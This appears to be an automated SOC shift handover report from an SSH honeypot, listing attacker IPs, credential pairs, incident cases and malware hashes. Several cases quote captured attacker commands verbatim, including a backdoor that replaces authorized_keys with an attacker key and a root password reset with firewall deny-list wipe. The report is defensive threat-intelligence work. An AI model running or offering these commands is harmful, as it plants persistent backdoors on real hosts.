# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-08 |
| **Generated At** | 2026-04-08T05:46:33Z |
| **Shift Time** | 05:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **76** |
| Confirmed Threats | **65** |
| False Positives Filtered | **11** (14.5%) |
| Unique Attacker IPs | **13** |
| Countries of Origin | **8** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **24** |
| Unique Credential Pairs | **16** |
| Unique Usernames | **10** |
| Unique Passwords | **15** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `ubuntu` | 2 |
| `hostinger` | 1 |
| `victor` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `123` | 2 |
| `password` | 1 |
| `QWERTYUIOP1234567` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `hostinger` | `password` | 1 |
| `victor` | `123` | 1 |
| `root` | `QWERTYUIOP1234567` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWERTYUIOP1234567` | `34.122.129.31` | 2026-04-08T02:11:45 |
| `root` | `3245gs5662d34` | `34.122.129.31` | 2026-04-08T02:11:50 |
| `root` | `P@$$w0rd2025` | `34.122.129.31` | 2026-04-08T02:13:11 |
| `root` | `google2` | `34.122.129.31` | 2026-04-08T02:14:39 |
| `root` | `A123456h^` | `34.122.129.31` | 2026-04-08T02:19:02 |
| `root` | `qwert2025` | `34.122.129.31` | 2026-04-08T02:27:51 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **76** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 25 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 25 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 25 | 2 | Modern SSH client |
| `95420f9d932d...` | Unknown | 3 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.122.129.31`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **13** |
| Unique ASNs | **13** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS2527` | Sony Network Communications Inc. | 1 | HIGH |
| `AS133275` | Gigantic Infotel Pvt Ltd | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS202425` | IP Volume inc | 1 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS9762` | kt HCN Co.,Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b6e5d883618d

| Field | Detail |
|---|---|
| **Source IP** | `180.184.141[.]117` |
| **First Seen** | 2026-04-08 02:08 |
| **Last Seen** | 2026-04-08 02:08 |
| **Session Duration** | 23s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `cat /proc/cpuinfo | grep name | wc -l, echo "root:VvMQKMBRSRpj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}', free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` |
| **Download Attempts** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1053.003 · T1057 · T1059.004 · T1083 · T1105 · T1489 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:08:36` | `cowrie.session.params` |
| `2026-04-08 02:08:36` | `cowrie.command.input` |
| `2026-04-08 02:08:36` | `cowrie.log.closed` |
| `2026-04-08 02:08:37` | `cowrie.session.params` |
| `2026-04-08 02:08:37` | `cowrie.command.input` |
| `2026-04-08 02:08:37` | `cowrie.log.closed` |
| `2026-04-08 02:08:37` | `cowrie.session.params` |
| `2026-04-08 02:08:37` | `cowrie.command.input` |
| `2026-04-08 02:08:37` | `cowrie.session.file_download` |
| `2026-04-08 02:08:37` | `cowrie.log.closed` |
| `2026-04-08 02:08:38` | `cowrie.session.params` |
| `2026-04-08 02:08:38` | `cowrie.command.input` |
| `2026-04-08 02:08:38` | `cowrie.log.closed` |
| `2026-04-08 02:08:38` | `cowrie.session.params` |
| `2026-04-08 02:08:38` | `cowrie.command.input` |
| `2026-04-08 02:08:39` | `cowrie.log.closed` |
| `2026-04-08 02:08:39` | `cowrie.session.params` |
| `2026-04-08 02:08:39` | `cowrie.command.input` |
| `2026-04-08 02:08:39` | `cowrie.command.input` |
| `2026-04-08 02:08:39` | `cowrie.log.closed` |
| `2026-04-08 02:08:40` | `cowrie.session.params` |
| `2026-04-08 02:08:40` | `cowrie.command.input` |
| `2026-04-08 02:08:40` | `cowrie.log.closed` |
| `2026-04-08 02:08:40` | `cowrie.session.params` |
| `2026-04-08 02:08:40` | `cowrie.command.input` |
| `2026-04-08 02:08:41` | `cowrie.log.closed` |
| `2026-04-08 02:08:41` | `cowrie.session.params` |
| `2026-04-08 02:08:41` | `cowrie.command.input` |
| `2026-04-08 02:08:41` | `cowrie.log.closed` |
| `2026-04-08 02:08:42` | `cowrie.session.params` |
| `2026-04-08 02:08:42` | `cowrie.command.input` |
| `2026-04-08 02:08:42` | `cowrie.log.closed` |
| `2026-04-08 02:08:42` | `cowrie.session.params` |
| `2026-04-08 02:08:42` | `cowrie.command.input` |
| `2026-04-08 02:08:42` | `cowrie.log.closed` |
| `2026-04-08 02:08:43` | `cowrie.session.params` |
| `2026-04-08 02:08:43` | `cowrie.command.input` |
| `2026-04-08 02:08:43` | `cowrie.log.closed` |
| `2026-04-08 02:08:43` | `cowrie.session.params` |
| `2026-04-08 02:08:43` | `cowrie.command.input` |
| `2026-04-08 02:08:44` | `cowrie.log.closed` |
| `2026-04-08 02:08:44` | `cowrie.session.params` |
| `2026-04-08 02:08:44` | `cowrie.command.input` |
| `2026-04-08 02:08:44` | `cowrie.log.closed` |
| `2026-04-08 02:08:45` | `cowrie.session.params` |
| `2026-04-08 02:08:45` | `cowrie.command.input` |
| `2026-04-08 02:08:45` | `cowrie.log.closed` |
| `2026-04-08 02:08:45` | `cowrie.session.params` |
| `2026-04-08 02:08:45` | `cowrie.command.input` |
| `2026-04-08 02:08:45` | `cowrie.log.closed` |
| `2026-04-08 02:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.141[.]117` to AbuseIPDB if not already reported
- [ ] Block `180.184.141[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f33808ecf0ab

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:11 |
| **Last Seen** | 2026-04-08 02:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:11:43` | `cowrie.session.connect` |
| `2026-04-08 02:11:43` | `cowrie.client.version` |
| `2026-04-08 02:11:44` | `cowrie.client.kex` |
| `2026-04-08 02:11:45` | `cowrie.login.success` |
| `2026-04-08 02:11:45` | `cowrie.session.params` |
| `2026-04-08 02:11:45` | `cowrie.command.input` |
| `2026-04-08 02:11:45` | `cowrie.command.failed` |
| `2026-04-08 02:11:45` | `cowrie.log.closed` |
| `2026-04-08 02:11:46` | `cowrie.session.params` |
| `2026-04-08 02:11:46` | `cowrie.command.input` |
| `2026-04-08 02:11:46` | `cowrie.session.file_download` |
| `2026-04-08 02:11:46` | `cowrie.log.closed` |
| `2026-04-08 02:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc35495b80b6

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:11 |
| **Last Seen** | 2026-04-08 02:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:11:49` | `cowrie.session.connect` |
| `2026-04-08 02:11:49` | `cowrie.client.version` |
| `2026-04-08 02:11:49` | `cowrie.client.kex` |
| `2026-04-08 02:11:50` | `cowrie.login.success` |
| `2026-04-08 02:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb0e7633800f

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:13 |
| **Last Seen** | 2026-04-08 02:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:13:10` | `cowrie.session.connect` |
| `2026-04-08 02:13:10` | `cowrie.client.version` |
| `2026-04-08 02:13:10` | `cowrie.client.kex` |
| `2026-04-08 02:13:11` | `cowrie.login.success` |
| `2026-04-08 02:13:11` | `cowrie.session.params` |
| `2026-04-08 02:13:11` | `cowrie.command.input` |
| `2026-04-08 02:13:11` | `cowrie.command.failed` |
| `2026-04-08 02:13:12` | `cowrie.log.closed` |
| `2026-04-08 02:13:12` | `cowrie.session.params` |
| `2026-04-08 02:13:12` | `cowrie.command.input` |
| `2026-04-08 02:13:12` | `cowrie.session.file_download` |
| `2026-04-08 02:13:12` | `cowrie.log.closed` |
| `2026-04-08 02:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50c89d28396

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:13 |
| **Last Seen** | 2026-04-08 02:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:13:15` | `cowrie.session.connect` |
| `2026-04-08 02:13:15` | `cowrie.client.version` |
| `2026-04-08 02:13:15` | `cowrie.client.kex` |
| `2026-04-08 02:13:16` | `cowrie.login.success` |
| `2026-04-08 02:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79106b108593

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:14 |
| **Last Seen** | 2026-04-08 02:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:14:38` | `cowrie.session.connect` |
| `2026-04-08 02:14:38` | `cowrie.client.version` |
| `2026-04-08 02:14:38` | `cowrie.client.kex` |
| `2026-04-08 02:14:39` | `cowrie.login.success` |
| `2026-04-08 02:14:40` | `cowrie.session.params` |
| `2026-04-08 02:14:40` | `cowrie.command.input` |
| `2026-04-08 02:14:40` | `cowrie.command.failed` |
| `2026-04-08 02:14:40` | `cowrie.log.closed` |
| `2026-04-08 02:14:41` | `cowrie.session.params` |
| `2026-04-08 02:14:41` | `cowrie.command.input` |
| `2026-04-08 02:14:41` | `cowrie.session.file_download` |
| `2026-04-08 02:14:41` | `cowrie.log.closed` |
| `2026-04-08 02:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e2d7572921

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:14 |
| **Last Seen** | 2026-04-08 02:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:14:44` | `cowrie.session.connect` |
| `2026-04-08 02:14:44` | `cowrie.client.version` |
| `2026-04-08 02:14:44` | `cowrie.client.kex` |
| `2026-04-08 02:14:45` | `cowrie.login.success` |
| `2026-04-08 02:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ed24be8012

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:19 |
| **Last Seen** | 2026-04-08 02:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:19:01` | `cowrie.session.connect` |
| `2026-04-08 02:19:01` | `cowrie.client.version` |
| `2026-04-08 02:19:01` | `cowrie.client.kex` |
| `2026-04-08 02:19:02` | `cowrie.login.success` |
| `2026-04-08 02:19:03` | `cowrie.session.params` |
| `2026-04-08 02:19:03` | `cowrie.command.input` |
| `2026-04-08 02:19:03` | `cowrie.command.failed` |
| `2026-04-08 02:19:03` | `cowrie.log.closed` |
| `2026-04-08 02:19:03` | `cowrie.session.params` |
| `2026-04-08 02:19:03` | `cowrie.command.input` |
| `2026-04-08 02:19:04` | `cowrie.session.file_download` |
| `2026-04-08 02:19:04` | `cowrie.log.closed` |
| `2026-04-08 02:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d4cfee7abc9

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:19 |
| **Last Seen** | 2026-04-08 02:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:19:06` | `cowrie.session.connect` |
| `2026-04-08 02:19:06` | `cowrie.client.version` |
| `2026-04-08 02:19:07` | `cowrie.client.kex` |
| `2026-04-08 02:19:08` | `cowrie.login.success` |
| `2026-04-08 02:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7869cebfc76a

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:27 |
| **Last Seen** | 2026-04-08 02:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:27:50` | `cowrie.session.connect` |
| `2026-04-08 02:27:50` | `cowrie.client.version` |
| `2026-04-08 02:27:50` | `cowrie.client.kex` |
| `2026-04-08 02:27:51` | `cowrie.login.success` |
| `2026-04-08 02:27:52` | `cowrie.session.params` |
| `2026-04-08 02:27:52` | `cowrie.command.input` |
| `2026-04-08 02:27:52` | `cowrie.command.failed` |
| `2026-04-08 02:27:52` | `cowrie.log.closed` |
| `2026-04-08 02:27:53` | `cowrie.session.params` |
| `2026-04-08 02:27:53` | `cowrie.command.input` |
| `2026-04-08 02:27:53` | `cowrie.session.file_download` |
| `2026-04-08 02:27:53` | `cowrie.log.closed` |
| `2026-04-08 02:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26926e3139e

| Field | Detail |
|---|---|
| **Source IP** | `34.122.129[.]31` |
| **First Seen** | 2026-04-08 02:27 |
| **Last Seen** | 2026-04-08 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 02:27:56` | `cowrie.session.connect` |
| `2026-04-08 02:27:56` | `cowrie.client.version` |
| `2026-04-08 02:27:56` | `cowrie.client.kex` |
| `2026-04-08 02:27:57` | `cowrie.login.success` |
| `2026-04-08 02:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.122.129[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.122.129[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `59.103.104[.]66` | **25** | 2026-04-08 02:57 | 2026-04-08 03:03 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `34.122.129[.]31` | **14** | 2026-04-08 02:08 | 2026-04-08 02:27 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.141[.]117` | **5** | 2026-04-08 02:08 | 2026-04-08 02:10 | 9m | 0 | `T1592` | 🟢 LOW |
| `3.134.216[.]108` | **3** | 2026-04-08 03:34 | 2026-04-08 03:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.242.152[.]161` | 1 | 2026-04-08 03:41 | 2026-04-08 03:41 | 14s | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-04-08 02:15 | 2026-04-08 02:15 | 31s | 0 | `T1592` | 🟢 LOW |
| `162.243.208[.]127` | 1 | 2026-04-08 02:51 | 2026-04-08 02:51 | 2s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]19` | 1 | 2026-04-08 03:19 | 2026-04-08 03:19 | 9s | 0 | `T1592` | 🟢 LOW |
| `211.47.126[.]146` | 1 | 2026-04-08 05:45 | 2026-04-08 05:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.78.245[.]164` | 1 | 2026-04-08 05:26 | 2026-04-08 05:27 | 34s | 0 | `T1592` | 🟢 LOW |
| `8.213.215[.]131` | 1 | 2026-04-08 02:18 | 2026-04-08 02:18 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
